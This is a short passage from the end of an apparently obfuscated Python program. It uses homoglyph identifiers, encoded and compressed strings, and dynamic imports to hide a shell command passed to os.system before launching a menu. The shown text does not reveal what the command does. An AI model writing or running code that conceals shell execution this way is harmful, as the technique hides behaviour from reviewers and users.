        𝗼𝙨.system(__𝙞𝘮𝗽𝙤𝗿𝘵__(𝘭𝗠𝙄𝙄𝗠𝘭𝘔𝘕𝘐𝗜𝗡𝗠𝙡𝙡𝗜𝗠𝙡𝙈𝙡𝘐𝘔𝗜𝘔𝙄𝘕𝗠𝘐𝘭𝘭𝘭𝘕𝘭[𝗿𝗼𝘶𝙣𝘥(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__(𝘭𝙈𝘐𝗜𝘔𝗹𝘔𝙉𝙄𝘐𝘕𝙈𝗹𝘭𝘐𝙈𝘭𝗠𝘭𝙄𝙈𝗜𝙈𝙄𝙉𝙈𝙄𝗹𝙡𝗹𝗡𝗹[𝙧𝗼𝘂𝘯𝙙(𝗮𝙗𝘴(0.3032934121914719 + 0.95289721697634j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x8f\x8a\xc8(Hq\xb4\xb5\x05\x00\x89q\t_')).decode())
        𝘤𝙤𝘯𝘴𝘰𝗹𝗲.render_ascii()
        𝘦𝘹𝘪𝘁()
if __𝙣𝙖𝘮𝗲__ == __𝗶𝘮𝗽𝙤𝘳𝙩__(𝘭𝙈𝙄𝘐𝗠𝘭𝗠𝘕𝗜𝘐𝗡𝗠𝗹𝙡𝗜𝘔𝙡𝗠𝗹𝙄𝙈𝘐𝗠𝙄𝘕𝗠𝘐𝘭𝘭𝘭𝘕𝗹[𝗿𝘰𝙪𝘯𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__(𝗹𝙈𝙄𝘐𝗠𝘭𝙈𝗡𝗜𝗜𝙉𝙈𝘭𝘭𝙄𝗠𝘭𝙈𝘭𝗜𝘔𝗜𝗠𝗜𝘕𝗠𝘐𝙡𝗹𝘭𝙉𝙡[𝗿𝘰𝙪𝘯𝘥(𝗮𝘣𝘀(0.6849592744072261 + 0.7285813560636357j))]).decompress(b'x\xda\x8b0\xb4,\x89\x0c\xcf)\x8d0\xb4\xb0\x05\x00\x19/\x03\xc6')).decode():
    𝗠𝙚𝙣𝙪().main_menu()